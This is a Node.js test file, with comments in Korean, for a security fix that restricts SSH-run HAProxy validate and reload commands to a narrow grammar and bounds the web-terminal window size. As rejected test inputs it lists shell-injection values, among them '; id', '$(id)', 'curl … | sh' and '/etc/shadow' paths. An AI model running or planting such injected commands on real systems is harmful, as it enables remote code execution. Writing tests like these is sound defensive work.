/**
 * 보안 잔여 11-27 — 중계 서버(HAProxy) SSH 자동 배포의 검증 · 재적재 명령(M1) + 웹 SSH 창 크기(L6).
 *
 * M1(재현 — 고치기 전): proxy/deploy.js 는 deploy.validateCmd({file} 만 치환) · deploy.reloadCmd 를 **저장된 중계 서버 SSH 자격(root 일 수 있다)으로 셸에서**
 *   그대로 돌렸다. 저장 라우트(PUT /config · POST /proxies)는 adminOnly 라 설정 소유자가 아닌 admin 이 'curl …|sh' 를 저장하고 POST /deploy 로 화면에 가려진
 *   root 비밀번호로 중계 서버에서 임의 명령을 돌릴 수 있었다(2026-11-08 감사 axis-C C-1 · 157회차가 경로만 막고 남긴 것).
 *   이제 판정은 registry.resolveDeployCmd 하나 — portal.env(root) 값은 그대로, 화면/API 값은 좁은 문법의 정규형만 · 저장 · 시험 · 상태 확인 · 배포가 같은 함수 ·
 *   문법 밖 옛 값은 버리지도 실행하지도 않고 접속 전 거절 + deployCommands 표시 · 거절된 철거는 매핑을 '철거 보류' 로 남긴다(설계 반증 must — 열린 포트 은폐 방지).
 * L6: sshGateway 의 shell({cols, rows}) · setWindow 가 수 범위를 보지 않았다(-1 → 0xFFFFFFFF · 1e9 · 1.5 가 대상 sshd 로) — termDim 하나로 정수 1~1000.
 *
 * 실제 express 라우트(authMiddleware + requireEnrolled + remoteRouter) · 실제 ssh2 가짜 sshd(접속 · exec 수를 센다) · 실제 게이트웨이 처리기 + 가짜 ssh2 Client.
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import crypto from 'node:crypto';
import http from 'node:http';
import { EventEmitter } from 'node:events';
import { PassThrough } from 'node:stream';
import ssh2 from 'ssh2';

const DIR = fs.mkdtempSync(path.join(process.env.TMPDIR || os.tmpdir(), 'sec1127p-'));
Object.assign(process.env, { CONFIG_DIR: DIR, AUTH_ENABLED: 'true', AUTH_SECRET: 'sec1127-proxy-secret-0123456789abcdefghij', AUTH_TOKEN_TTL: '8h', DATA_SOURCE: 'live', OTP_ROLE_ENFORCE: 'false', SSRF_ALLOW_LOOPBACK: 'true', SSH_HOSTKEY_POLICY: 'observe' });
delete process.env.CENTRAL_URL; delete process.env.PROXY_RELOAD_CMD; delete process.env.PROXY_VALIDATE_CMD;
fs.writeFileSync(path.join(DIR, 'runtime.json'), JSON.stringify({ dataSource: 'live' }));
const closers = [];
test.after(async () => {
  for (const c of closers) { try { await c(); } catch { /* */ } }
  fs.rmSync(DIR, { recursive: true, force: true });
});

/* ── 가짜 중계 서버(sshd) — 접속 · exec 를 센다(SFTP 없음: 배포는 설정 파일 읽기에서 멈추지만 접속은 일어난다) ── */
const { privateKey } = crypto.generateKeyPairSync('rsa', { modulusLength: 2048, privateKeyEncoding: { type: 'pkcs1', format: 'pem' }, publicKeyEncoding: { type: 'spki', format: 'pem' } });
const seen = { conns: 0, cmds: [] };
const sshd = new ssh2.Server({ hostKeys: [privateKey] }, (client) => {
  seen.conns += 1;
  client.on('authentication', (ctx) => (ctx.method === 'password' && ctx.password === 'Stored-Root-Pw' ? ctx.accept() : ctx.reject(['password'])));
  client.on('ready', () => client.on('session', (accept) => { const s = accept(); s.on('exec', (acc, _rej, info) => { seen.cmds.push(info.command); const st = acc(); st.write('OK\n'); st.exit(0); st.end(); }); }));
  client.on('error', () => {});
});
await new Promise((r) => sshd.listen(0, '127.0.0.1', r));
closers.push(() => new Promise((r) => sshd.close(() => r())));
const SSHD_PORT = sshd.address().port;
const snap = () => ({ conns: seen.conns, cmds: seen.cmds.length });
const assertNoContact = (s0, what) => { assert.equal(seen.conns, s0.conns, `${what}: 접속하면 안 된다`); assert.equal(seen.cmds.length, s0.cmds, `${what}: 명령이 나가면 안 된다 ${JSON.stringify(seen.cmds.slice(s0.cmds))}`); };

/* ── '이미 저장된' 옛 설정(업그레이드 전 현장 — 문법 밖 명령) — 등록부를 불러오기 전에 파일로 둔다 ── */
const BAD_VALIDATE = 'haproxy -c -f {file} | tee /tmp/x';
const BAD_RELOAD = 'systemctl reload haproxy && echo done';
const sshDep = (extra = {}) => ({ enabled: true, host: '127.0.0.1', port: SSHD_PORT, username: 'root', password: 'Stored-Root-Pw', haproxyConfigPath: '/etc/haproxy/haproxy.cfg', ...extra });
const FILE = path.join(DIR, 'remote-access.json');
fs.writeFileSync(FILE, JSON.stringify({
  proxyHost: '', publicPortBase: 20000,
  deploy: sshDep({ validateCmd: BAD_VALIDATE }),
  proxies: [
    { id: 'p1', name: '법인A 중계', vcenterIds: ['vc-a', 'vc-b'], proxyHost: '10.9.9.9', publicPortBase: 21000, deploy: sshDep({ reloadCmd: BAD_RELOAD }) },
    { id: 'p2', name: '정상 중계', vcenterIds: ['vc-c'], proxyHost: '10.9.9.10', publicPortBase: 22000, deploy: sshDep() },
  ],
  mappings: [],
}, null, 2));
const readFileJson = () => JSON.parse(fs.readFileSync(FILE, 'utf8'));

const reg = await import('../src/proxy/registry.js');
const dep = await import('../src/proxy/deploy.js');
const prov = await import('../src/proxy/provision.js');
const exp = await import('../src/proxy/expiry.js');
const gw = await import('../src/proxy/sshGateway.js');
const auth = await import('../src/auth/auth.js');
const { store } = await import('../src/store.js');
const { remoteRouter } = await import('../src/routes/remote.js');
store.snapshot = { ...store.get(), vcenters: [{ id: 'vc-a' }, { id: 'vc-b' }, { id: 'vc-c' }], vms: [], hosts: [] };

const mk = (u) => assert.equal(auth.createUser(u, { trusted: true }).ok, true, u.username);
mk({ username: 'fadm', role: 'admin', password: 'Passw0rd!long1' });                                   // 전체 범위 admin(설정 소유자 아님)
mk({ username: 'sadm', role: 'admin', password: 'Passw0rd!long1', scope: { vcenters: ['vc-a'] } });   // 범위 관리자
mk({ username: 'op1', role: 'operator', password: 'Passw0rd!long1' });                                // 원격 접속 권한 · 비관리자
const tok = (name) => {
  const u = auth.getUser(name); const sid = `sid-${name}`; const expS = Math.floor(Date.now() / 1000) + 3600;
  const t = auth.signToken({ sub: name, role: u.role, name: u.name || name, src: 'local', tv: u.tokenVersion || 0, sid }, { exp: expS });
  auth.noteIssuedSession({ sub: name, sid, exp: expS });
  return t;
};
const TOK = { fadm: tok('fadm'), sadm: tok('sadm'), op1: tok('op1') };
const express = (await import('express')).default;
const app = express(); app.use(express.json()); app.use('/api/remote', auth.authMiddleware, auth.requireEnrolled, remoteRouter);
const web = await new Promise((r) => { const s = app.listen(0, '127.0.0.1', () => r(s)); });
closers.push(() => new Promise((r) => web.close(() => r())));
const call = async (who, method, p, body) => {
  const r = await fetch(`http://127.0.0.1:${web.address().port}/api/remote${p}`, { method, headers: { 'content-type': 'application/json', authorization: `Bearer ${TOK[who]}` }, ...(body !== undefined ? { body: JSON.stringify(body) } : {}) });
  return { status: r.status, body: await r.json().catch(() => null) };
};
const withEnv = async (k, v, fn) => { const prev = process.env[k]; if (v == null) delete process.env[k]; else process.env[k] = v; try { return await fn(); } finally { if (prev === undefined) delete process.env[k]; else process.env[k] = prev; } };

/* ═══════════════ T1 문법(순수) ═══════════════ */
test('T1 parseDeployCmd — 좁은 문법만 통과 · 정규형 · 셸 기호 · 다른 실행 파일 · 범위 밖 경로 · 다른 유닛은 거절', () => {
  const ok = (kind, s, canon) => { const r = reg.parseDeployCmd(kind, s); assert.equal(r.ok, true, `${s} → ${JSON.stringify(r)}`); if (canon) assert.equal(r.canonical, canon); };
  const no = (kind, s) => { const r = reg.parseDeployCmd(kind, s); assert.equal(r.ok, false, `거절해야 한다: ${JSON.stringify(s)} → ${JSON.stringify(r)}`); assert.ok(r.issue); };
  for (const s of ['haproxy -c -f {file}', '/usr/sbin/haproxy -c -f {file}', '/opt/rh/rh-haproxy18/root/usr/sbin/haproxy -c -f {file} -f /etc/haproxy/conf.d',
    'haproxy -f {file} -c', 'haproxy -c -V -f {file}', 'haproxy -c -q -V -f {file} -f /etc/haproxy/a.cfg -f /etc/haproxy/b.cfg -f /etc/haproxy/c.cfg -f /etc/haproxy/conf.d/']) ok('validateCmd', s, s);
  ok('validateCmd', 'sudo -n haproxy -c -f {file}', 'sudo -n haproxy -c -f {file}');
  ok('validateCmd', 'sudo /usr/local/sbin/haproxy -c -q -f {file}', 'sudo -n /usr/local/sbin/haproxy -c -q -f {file}');   // sudo 는 -n 으로(반증 N-4 — tty 없는 대기 대신 즉시 실패)
  ok('validateCmd', '  haproxy   -c -f {file} ', 'haproxy -c -f {file}');
  for (const s of ['systemctl reload haproxy', 'systemctl restart haproxy.service', '/usr/bin/systemctl reload-or-restart haproxy', 'systemctl try-reload-or-restart haproxy',
    'sudo -n systemctl reload haproxy', 'service haproxy reload', 'systemctl reload rh-haproxy18-haproxy', 'systemctl reload haproxy@edge']) ok('reloadCmd', s, s);
  ok('reloadCmd', 'sudo /sbin/service haproxy restart', 'sudo -n /sbin/service haproxy restart');
  ok('reloadCmd', ' systemctl  reload   haproxy ', 'systemctl reload haproxy');
  for (const s of ['haproxy -c -f {file}; id', '$(id)', 'haproxy -c -f {file} && curl x|sh', 'haproxy -c -f `id`', 'haproxy -c -f {file}\nid', 'haproxy\t-c -f {file}',
    'haproxy -c -f /etc/haproxy/haproxy.cfg', 'haproxy -c -f {file} -f {file}', 'bash -c id', '/tmp/x/haproxy -c -f {file}', '/opt/../tmp/x/sbin/haproxy -c -f {file}',
    '/opt/rh/../../tmp/root/usr/sbin/haproxy -c -f {file}', '/opt/rh/../root/usr/sbin/haproxy -c -f {file}', '/opt/rh/./root/usr/sbin/haproxy -c -f {file}', '/opt/evil/sbin/haproxy -c -f {file}', 'haproxy -c -f {file} -f rel/x', 'haproxy -c -f {file} -f /etc/shadow',
    'haproxy -c -f {file} -f /dev/stdin', 'haproxy -c -f {file} -f /etc/haproxy/../shadow', 'haproxy -c -f {file} -f /etc/haproxy//x',
    'haproxy -c -f {file} -f /etc/haproxy/1 -f /etc/haproxy/2 -f /etc/haproxy/3 -f /etc/haproxy/4 -f /etc/haproxy/5', 'sudo -u root haproxy -c -f {file}', '-haproxy -c -f {file}',
    'haproxy -f {file}', 'haproxy -c -c -f {file}', 'haproxy -c -dr -f {file}', 'haproxy -c -f', 'haproxy -c -f {file} -- x', `haproxy -c -f {file} ${'a'.repeat(290)}`, 'haproxy -c -f {file} {x}', '', '   ']) no('validateCmd', s);
  for (const s of [5, null, {}, ['haproxy'], `${'x'.repeat(301)}`]) no('validateCmd', s);
  // 문법은 맞지만 300자를 넘는다 — 길이 상한이 먼저(판정 비용 · 화면 · 파일 크기)
  const long = `haproxy -c -f {file} -f /etc/haproxy/${'a'.repeat(100)} -f /etc/haproxy/${'b'.repeat(100)} -f /etc/haproxy/${'c'.repeat(60)}`;
  assert.ok(long.length > 300 && long.length < 340, String(long.length));
  ok('validateCmd', long.replace(`/etc/haproxy/${'c'.repeat(60)}`, '/etc/haproxy/c'));
  no('validateCmd', long);
  for (const s of ['systemctl reload haproxy; id', 'systemctl restart sshd', 'systemctl stop haproxy', 'systemctl kill haproxy', 'systemctl reload -- haproxy', 'systemctl reload haproxy sshd',
    'systemctl reload haproxy*', 'systemctl reload --now haproxy', 'systemctl reload -haproxy', 'docker kill -s HUP haproxy', 'kill -HUP 1', 'service sshd restart', 'service haproxy stop',
    'sudo -u root systemctl reload haproxy', 'sudo sudo systemctl reload haproxy', 'systemctl reload $(echo haproxy)', 'systemctl reload network', '/tmp/systemctl reload haproxy']) no('reloadCmd', s);
  no('otherCmd', 'haproxy -c -f {file}');
  // 사유가 맞는 단계에서 나온다(글자 집합이 낱말 문법보다 먼저 — 셸 기호는 어디에 있든 첫 단계에서 거절)
  for (const [kind, s] of [['reloadCmd', 'systemctl reload haproxy;id'], ['reloadCmd', 'systemctl reload $HAPROXY'], ['validateCmd', 'haproxy -c -f {file}|x'], ['validateCmd', 'haproxy -c -f {file}&'], ['reloadCmd', 'systemctl reload "haproxy"']]) {
    assert.match(reg.parseDeployCmd(kind, s).issue, /쓸 수 없는 글자/, s);
  }
  assert.match(reg.parseDeployCmd('validateCmd', 'sudo -u root haproxy -c -f {file}').issue, /sudo 옵션/);
  assert.match(reg.parseDeployCmd('reloadCmd', 'sudo -E systemctl reload haproxy').issue, /sudo 옵션/);
  // ReDoS — 길이를 먼저 자른다(10배 입력이 10배 남짓 이하)
  const timeOf = (n) => { const s = 'haproxy -c '.repeat(Math.ceil(n / 11)).slice(0, n); const t0 = process.hrtime.bigint(); for (let i = 0; i < 20; i += 1) reg.parseDeployCmd('validateCmd', s); return Number(process.hrtime.bigint() - t0); };
  timeOf(50_000);
  const a = timeOf(50_000); const b = timeOf(500_000);
  assert.ok(b / Math.max(a, 1) < 30, `5만 자 ${a}ns · 50만 자 ${b}ns — 길이 상한이 먼저여야 한다`);
});

/* ═══════════════ T2 출처 — 호출 시각에 읽는다 ═══════════════ */
test('T2 resolveDeployCmd — 빈 칸 = 운영자 env 또는 내장 · env 와 같은 글자는 신뢰 · 그 밖은 문법 · env 는 호출 시각에 읽는다', async () => {
  await withEnv('PROXY_RELOAD_CMD', null, async () => {
    assert.deepEqual(reg.resolveDeployCmd({}, 'reloadCmd'), { cmd: 'systemctl reload haproxy', source: 'builtin', stored: null, issue: null });
    assert.equal(reg.resolveDeployCmd({ reloadCmd: '   ' }, 'reloadCmd').source, 'builtin');
    assert.equal(reg.resolveDeployCmd(null, 'validateCmd').cmd, 'haproxy -c -f {file}');
  });
  await withEnv('PROXY_RELOAD_CMD', ' docker kill -s HUP haproxy-c1 ', async () => {
    assert.deepEqual(reg.resolveDeployCmd({}, 'reloadCmd'), { cmd: 'docker kill -s HUP haproxy-c1', source: 'env', stored: null, issue: null });
    assert.equal(reg.resolveDeployCmd({ reloadCmd: '' }, 'reloadCmd').cmd, 'docker kill -s HUP haproxy-c1', "'' 는 내장 기본이 아니라 운영자 값(빈 칸 = 기본값)");
    const same = reg.resolveDeployCmd({ reloadCmd: 'docker kill -s HUP haproxy-c1' }, 'reloadCmd');
    assert.equal(same.source, 'env'); assert.equal(same.cmd, 'docker kill -s HUP haproxy-c1'); assert.equal(same.issue, null);
    const other = reg.resolveDeployCmd({ reloadCmd: 'docker kill -s HUP other' }, 'reloadCmd');
    assert.equal(other.cmd, null, 'env 와 다른 별난 값은 env 가 있어도 문법을 탄다'); assert.ok(other.issue);
    assert.equal(reg.resolveDeployCmd({ reloadCmd: 'systemctl  restart haproxy' }, 'reloadCmd').cmd, 'systemctl restart haproxy');
    assert.equal(reg.resolveDeployCmd({ validateCmd: '' }, 'validateCmd').source, 'builtin', '다른 종류의 env 와 섞지 않는다');
  });
  // 같은 프로세스에서 env 가 바뀌면 바로 따른다(모듈 로드 때 굳히지 않는다)
  await withEnv('PROXY_VALIDATE_CMD', '/usr/sbin/haproxy -c -f {file} -dr', async () => { assert.equal(reg.resolveDeployCmd({}, 'validateCmd').cmd, '/usr/sbin/haproxy -c -f {file} -dr'); });
  assert.equal(reg.resolveDeployCmd({}, 'validateCmd').cmd, 'haproxy -c -f {file}');
  const nonText = reg.resolveDeployCmd({ reloadCmd: { cmd: 'id' } }, 'reloadCmd');
  assert.equal(nonText.cmd, null); assert.ok(nonText.issue);
});

/* ═══════════════ T3 저장(실제 라우트) ═══════════════ */
test('T3 저장 — 문법 밖 새 값은 400(파일 불변) · 문법 안은 정규형 저장 · 빈 칸은 키 삭제 · 새 항목에 기본값을 굳히지 않는다 · env 와 같은 값은 통과', async () => {
  const before = fs.readFileSync(FILE, 'utf8');
  const put = await call('fadm', 'PUT', '/config', { deploy: { reloadCmd: 'systemctl reload haproxy; id' } });
  assert.equal(put.status, 400, JSON.stringify(put.body)); assert.match(put.body.reason, /재적재/);
  assert.equal(fs.readFileSync(FILE, 'utf8'), before, '파일이 바뀌면 안 된다');
  const putV = await call('fadm', 'PUT', '/config', { deploy: { validateCmd: 'curl -s http://x/y' } });
  assert.equal(putV.status, 400); assert.match(putV.body.reason, /검증 명령/);
  const post = await call('fadm', 'POST', '/proxies', { id: 'p2', deploy: { reloadCmd: 'curl -s http://x/y | sh' } });
  assert.equal(post.status, 400, JSON.stringify(post.body)); assert.match(post.body.reason, /재적재/);
  assert.equal(fs.readFileSync(FILE, 'utf8'), before);
  const sp = reg.saveProxy({ name: 'x', deploy: { validateCmd: '$(id)' } });
  assert.equal(sp.ok, false); assert.match(sp.reason, /검증 명령/);
  // 문법 안 — 정규형으로 저장
  const good = await call('fadm', 'POST', '/proxies', { id: 'p2', deploy: { reloadCmd: '  sudo  systemctl reload haproxy ' } });
  assert.equal(good.status, 200, JSON.stringify(good.body));
  assert.equal(readFileJson().proxies.find((p) => p.id === 'p2').deploy.reloadCmd, 'sudo -n systemctl reload haproxy');
  assert.equal(good.body.proxy.deployCommands.reloadCmd.source, 'saved');
  assert.equal(good.body.proxy.deployCommands.reloadCmd.value, 'sudo -n systemctl reload haproxy');
  // 빈 칸 → 키 삭제(기본값 사용)
  assert.equal((await call('fadm', 'POST', '/proxies', { id: 'p2', deploy: { reloadCmd: '' } })).status, 200);
  assert.equal('reloadCmd' in readFileJson().proxies.find((p) => p.id === 'p2').deploy, false, '빈 칸은 파일에 남지 않는다');
  // 새 중계 서버(명령 칸을 주지 않음) — 기본값을 파일에 굳히지 않는다(예전: DEFAULTS.deploy 가 env 값을 복사해 저장)
  const nw = reg.saveProxy({ name: 'new1', proxyHost: '10.9.9.11', deploy: { enabled: false } });
  assert.equal(nw.ok, true);
  const nwFile = readFileJson().proxies.find((p) => p.id === nw.proxy.id).deploy;
  assert.equal('validateCmd' in nwFile || 'reloadCmd' in nwFile, false, JSON.stringify(nwFile));
  assert.equal(reg.removeProxy(nw.proxy.id).ok, true);
  // 운영자 env 와 같은 글자(문법 밖)는 저장을 통과한다(반증 N-3 — 옛 화면이 env 가 굳은 값을 다시 보내도 막히지 않게) · env 가 바뀌면 실행은 거절된다
  await withEnv('PROXY_RELOAD_CMD', 'docker kill -s HUP haproxy-c1', async () => {
    const r = await call('fadm', 'POST', '/proxies', { id: 'p2', deploy: { reloadCmd: 'docker kill -s HUP haproxy-c1' } });
    assert.equal(r.status, 200, JSON.stringify(r.body));
    assert.equal(r.body.proxy.deployCommands.reloadCmd.source, 'env');
    process.env.PROXY_RELOAD_CMD = 'docker kill -s HUP haproxy-c2';
    assert.ok(reg.deployCmdRefusal(reg.getProxyById('p2').deploy), '저장값이 이제 env 와 다르다 — 문법 밖이라 거절');
  });
  assert.equal((await call('fadm', 'POST', '/proxies', { id: 'p2', deploy: { reloadCmd: '' } })).status, 200);
  assert.equal(reg.deployCmdRefusal(reg.getProxyById('p2').deploy), null);
});

/* ═══════════════ T4 문법 밖 옛 값 — 보이고 · 지우지 않고 · 실행하지 않는다 ═══════════════ */
test('T4a GET /config · /proxies/full 이 deployCommands(출처 · 형식 밖 사유 · 안내)를 싣는다', async () => {
  const c = await call('fadm', 'GET', '/config');
  assert.equal(c.status, 200);
  const v = c.body.config.deployCommands;
  assert.ok(v.validateCmd.issue, JSON.stringify(v)); assert.equal(v.validateCmd.value, null); assert.equal(v.validateCmd.stored, BAD_VALIDATE);
  assert.equal(v.reloadCmd.issue, null); assert.equal(v.reloadCmd.source, 'builtin'); assert.equal(v.reloadCmd.value, 'systemctl reload haproxy');
  assert.match(v.reloadCmd.help, /systemctl/); assert.equal(v.reloadCmd.help.includes('`'), false, '화면 문구에 백틱 금지');
  const f = await call('fadm', 'GET', '/proxies/full');
  const p1 = f.body.proxies.find((p) => p.id === 'p1');
  assert.ok(p1.deployCommands.reloadCmd.issue); assert.equal(p1.deployCommands.validateCmd.issue, null);
  assert.equal(p1.deploy.reloadCmd, BAD_RELOAD, '옛 값은 지우지 않는다');
  assert.equal(p1.deploy.password, '********');
});

test('T4b·c 다른 칸 저장은 바뀌지 않은 옛 값과 함께 통과(값 보존 · 계속 표시) · 다른 문법 밖 값으로 바꾸면 400', async () => {
  const f = await call('fadm', 'GET', '/proxies/full');
  const p1 = f.body.proxies.find((p) => p.id === 'p1');
  const r = await call('fadm', 'POST', '/proxies', { ...p1, name: '법인A 중계(새 이름)' });   // 화면이 받은 모양 그대로(deployCommands 칸 포함)
  assert.equal(r.status, 200, JSON.stringify(r.body));
  assert.equal(readFileJson().proxies.find((p) => p.id === 'p1').deploy.reloadCmd, BAD_RELOAD);
  assert.equal('deployCommands' in readFileJson().proxies.find((p) => p.id === 'p1'), false, '표시 칸은 저장되지 않는다');
  assert.ok(r.body.proxy.deployCommands.reloadCmd.issue);
  const c = await call('fadm', 'GET', '/config');
  const put = await call('fadm', 'PUT', '/config', { ...c.body.config, publicPortBase: 20100 });   // 기본 프록시도 같다
  assert.equal(put.status, 200, JSON.stringify(put.body));
  assert.equal(readFileJson().deploy.validateCmd, BAD_VALIDATE);
  // 다른 문법 밖 값 — 옛 값 예외는 '같은 글자' 뿐
  const bad = await call('fadm', 'POST', '/proxies', { id: 'p1', deploy: { reloadCmd: 'systemctl reload haproxy && id' } });
  assert.equal(bad.status, 400, JSON.stringify(bad.body));
  assert.equal(readFileJson().proxies.find((p) => p.id === 'p1').deploy.reloadCmd, BAD_RELOAD);
  // 다른 중계 서버의 옛 값을 옮겨 붙이는 것도 거절(예외는 그 항목의 원본 저장값만)
  assert.equal((await call('fadm', 'POST', '/proxies', { id: 'p2', deploy: { reloadCmd: BAD_RELOAD } })).status, 400);
  assert.equal((await call('fadm', 'PUT', '/config', { deploy: { reloadCmd: BAD_RELOAD } })).status, 400);
});

test('T4d·e·f·g·h 배포 · /deploy · 상태 확인 · 시험 · 매핑 생성이 접속 전에 거절한다(종류별) · 정상 본문의 시험은 두 명령을 실행하지 않는다', async () => {
  // d) 배포 — 재적재만 문법 밖(p1) · 검증만 문법 밖(기본) 각각
  let s0 = snap();
  const d1 = await dep.deployToProxy(reg.getProxyById('p1').deploy, []);
  assert.equal(d1.ok, false); assert.equal(d1.code, 'deploy-cmd-invalid'); assert.match(d1.reason, /재적재/); assert.match(d1.reason, /PROXY_RELOAD_CMD/);
  assertNoContact(s0, 'deployToProxy p1');
  s0 = snap();
  const d2 = await dep.deployToProxy(reg.getProxyById('default').deploy, []);
  assert.equal(d2.code, 'deploy-cmd-invalid'); assert.match(d2.reason, /검증 명령/);
  assertNoContact(s0, 'deployToProxy 기본');
  // e) POST /deploy
  s0 = snap();
  const e = await call('fadm', 'POST', '/deploy', { proxyId: 'p1' });
  assert.equal(e.status, 200); assert.equal(e.body.ok, false);
  assert.equal(e.body.results[0].ok, false); assert.equal(e.body.results[0].code, 'deploy-cmd-invalid'); assert.match(e.body.results[0].reason, /재적재/);
  assertNoContact(s0, 'POST /deploy');
  // f) 상태 확인(화면이 마운트 때 부른다) — 🔴 + 사유
  s0 = snap();
  const h1 = await call('fadm', 'POST', '/proxies/p1/health', {});
  assert.equal(h1.body.ok, false); assert.equal(h1.body.method, 'ssh'); assert.match(h1.body.reason, /재적재/);
  const h2 = await call('fadm', 'POST', '/proxies/default/health', {});
  assert.equal(h2.body.ok, false); assert.match(h2.body.reason, /검증 명령/);
  assertNoContact(s0, '상태 확인');
  // g) 시험 — 요청 본문의 명령도 같은 판정(정상 저장 프록시 p2)
  s0 = snap();
  for (const body of [{ reloadCmd: 'systemctl reload haproxy; id' }, { validateCmd: 'haproxy -c -f {file} 2>&1' }]) {
    const g = await call('fadm', 'POST', '/deploy/test', { proxyId: 'p2', deploy: body });
    assert.equal(g.body.ok, false, JSON.stringify(g.body)); assert.equal(g.body.code, 'deploy-cmd-invalid');
  }
  assertNoContact(s0, '/deploy/test 본문');
  s0 = snap();
  const g2 = await call('fadm', 'POST', '/deploy/test', { proxyId: 'p2', deploy: { reloadCmd: 'systemctl restart haproxy' } });
  assert.equal(g2.body.ok, true, JSON.stringify(g2.body));
  assert.equal(seen.conns, s0.conns + 1);
  assert.deepEqual(seen.cmds.slice(s0.cmds), ['haproxy -v 2>&1 | head -1', 'test -r /etc/haproxy/haproxy.cfg && echo OK || echo MISSING'], '시험은 두 명령을 실행하지 않는다');
  assert.equal(g2.body.commands.reloadCmd.value, 'systemctl restart haproxy');
  // h) 매핑 생성(provision) — 매핑 오류 문구에는 구성 단서(env 이름 · 명령)를 싣지 않는다(소유자가 비관리자일 수 있다)
  s0 = snap();
  const m = reg.addMapping({ protocol: 'ssh', targetHost: '10.1.1.5', targetPort: 22, proxyId: 'p1', vcenterId: 'vc-a', owner: 'op1', ephemeral: true });
  assert.equal(m.ok, true, m.reason);
  await prov.provision(m.mapping);
  const got = reg.getMapping(m.mapping.id);
  assert.equal(got.status, 'error'); assert.equal(got.error, reg.DEPLOY_CMD_MAPPING_TEXT);
  assert.equal(/portal\.env|PROXY_/.test(got.error), false);
  assertNoContact(s0, 'provision');
});

/* ═══════════════ 철거 보류(설계 반증 must) ═══════════════ */
test('철거 — 배포 명령 거절이면 만료 · 삭제가 매핑을 지우지 않고 철거 보류로 남긴다(열린 포트를 숨기지 않는다) · 접속 · 재사용 막음 · 고치면 다음 배포가 정리', async () => {
  const held = reg.listMappings().find((x) => x.targetHost === '10.1.1.5');
  held.lastUsedAt = new Date(Date.now() - 3 * 86_400_000).toISOString();   // 만료 대상
  let s0 = snap();
  assert.equal(await exp.pruneExpiredMappings(), 0, '거절된 철거는 지운 것으로 세지 않는다');
  assert.ok(reg.getMapping(held.id), '매핑이 남아 있어야 한다(예전: 등록부만 지워 HAProxy 포트가 화면 밖에서 열린 채 남았다)');
  assert.equal(reg.getMapping(held.id).status, prov.TEARDOWN_PENDING);
  assertNoContact(s0, '만료 철거');
  // 다시 돌려도 같다(시각과 무관하게 매 주기 재시도) · 사용 시각을 되살려도 보류는 풀리지 않는다
  reg.getMapping(held.id).lastUsedAt = new Date().toISOString();
  assert.equal(await exp.pruneExpiredMappings(), 0);
  assert.equal(reg.getMapping(held.id).status, prov.TEARDOWN_PENDING);
  // 게이트웨이 접속 · 열린 세션 재검사가 막는다
  assert.equal(gw.mappingAccessIssue({ username: 'fadm', role: 'admin', scope: {} }, reg.getMapping(held.id)), reg.MAPPING_TEARDOWN_TEXT);
  // 관리자 생성 매핑 삭제 — 409 · 사유(관리자에게만 운영자 탈출구 안내)
  const am = reg.addMapping({ protocol: 'ssh', targetHost: '10.1.1.6', targetPort: 22, proxyId: 'p1', owner: 'op1' });
  s0 = snap();
  const delOp = await call('op1', 'DELETE', `/mappings/${am.mapping.id}`);
  assert.equal(delOp.status, 409, JSON.stringify(delOp.body)); assert.equal(delOp.body.code, prov.TEARDOWN_PENDING);
  assert.equal(delOp.body.reason, prov.TEARDOWN_PENDING_TEXT); assert.equal(/portal\.env|PROXY_/.test(delOp.body.reason), false, '비관리자에게 구성 단서를 주지 않는다');
  const delAdm = await call('fadm', 'DELETE', `/mappings/${am.mapping.id}`);
  assert.equal(delAdm.status, 409); assert.match(delAdm.body.reason, /PROXY_RELOAD_CMD/);
  assert.equal(reg.getMapping(am.mapping.id).status, prov.TEARDOWN_PENDING);
  assertNoContact(s0, '삭제');
  // 보류 매핑은 공개 포트를 계속 차지한다(아직 열려 있다) · quick-connect 는 되살리지 않고 새로 만든다
  const qc = await call('op1', 'POST', '/quick-connect', { targetHost: '10.1.1.5', targetPort: 22, protocol: 'ssh', vcenterId: 'vc-a' });
  assert.equal(qc.status, 200, JSON.stringify(qc.body));
  assert.notEqual(qc.body.mapping.id, held.id, '철거 보류 매핑을 재사용하면 안 된다');
  assert.notEqual(qc.body.mapping.publicPort, held.publicPort);
  assert.equal(reg.getMapping(held.id).status, prov.TEARDOWN_PENDING, '재사용 경로가 보류 상태를 덮지 않는다');
  // 중계 서버 삭제도 막힌다(포트가 열린 매핑이 남아 있다)
  assert.equal(reg.removeProxy('p1').ok, false);

  // 관리자가 명령을 고친다 → 다음 성공 배포가 보류 매핑을 블록에서 빼고(= 닫고) 등록부에서 지운다
  assert.equal((await call('fadm', 'POST', '/proxies', { id: 'p1', deploy: { reloadCmd: '' } })).status, 200);
  const wrote = []; const execs = [];
  dep._setDeployDepsForTest({ withSsh: async (_c, fn) => fn({
    readFile: async () => 'global\n',
    writeFile: async (p, body) => { wrote.push({ p, body }); },
    exec: async (cmd) => { execs.push(cmd); return { code: 0, stdout: '', stderr: '' }; },
  }) });
  try {
    const r = await call('fadm', 'POST', '/deploy', { proxyId: 'p1' });
    assert.equal(r.body.ok, true, JSON.stringify(r.body));
    const block = wrote[wrote.length - 1].body;
    assert.equal(block.includes(`ra_${held.id}`), false, '보류 매핑은 블록에서 빠진다(listen 이 닫힌다)');
    assert.equal(block.includes(`ra_${am.mapping.id}`), false);
    assert.ok(block.includes(`ra_${qc.body.mapping.id}`), '살아 있는 매핑은 블록에 있다');
    assert.equal(reg.getMapping(held.id), null, '닫혔으니 등록부에서도 지운다');
    assert.equal(reg.getMapping(am.mapping.id), null);
    assert.equal(execs[execs.length - 1], 'systemctl reload haproxy');
    // 일시 실패가 아닌 성공 철거는 예전처럼 지운다(DELETE 200)
    const del = await call('op1', 'DELETE', `/mappings/${qc.body.mapping.id}`);
    assert.equal(del.status, 200, JSON.stringify(del.body)); assert.equal(reg.getMapping(qc.body.mapping.id), null);
  } finally { dep._setDeployDepsForTest(null); }
});

test('철거 — 만료 작업도 고친 뒤에는 보류 매핑을 철거해 지운다 · 기동 경고는 형식 밖 중계 서버 수를 센다', async () => {
  // 기본 프록시는 아직 검증 명령이 형식 밖이다
  const m = reg.addMapping({ protocol: 'ssh', targetHost: '10.1.1.7', targetPort: 22, proxyId: 'default', owner: 'op1', ephemeral: true });
  reg.getMapping(m.mapping.id).lastUsedAt = new Date(Date.now() - 3 * 86_400_000).toISOString();
  assert.equal(exp.warnBadDeployCmds(), 1, '기본 프록시 한 곳');
  assert.equal(await exp.pruneExpiredMappings(), 0);
  assert.equal(reg.getMapping(m.mapping.id).status, prov.TEARDOWN_PENDING);
